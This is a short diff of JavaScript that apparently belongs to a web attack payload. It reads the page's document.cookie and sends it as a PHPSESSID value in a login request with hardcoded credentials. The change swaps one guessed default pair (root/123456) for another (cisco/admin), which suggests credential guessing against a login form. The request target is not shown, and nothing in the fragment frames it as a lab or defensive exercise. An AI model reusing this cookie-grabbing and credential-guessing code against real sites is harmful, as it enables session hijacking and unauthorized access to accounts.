@@ -18,7 +18,7 @@
         const cook = document.cookie;
 
 
-        http.send("PHPSESSID="+cook+"&username=root&pin=123456&notRobot=on");
+        http.send("PHPSESSID="+cook+"&username=cisco&pin=admin&notRobot=on");
 //     }
 // }
    
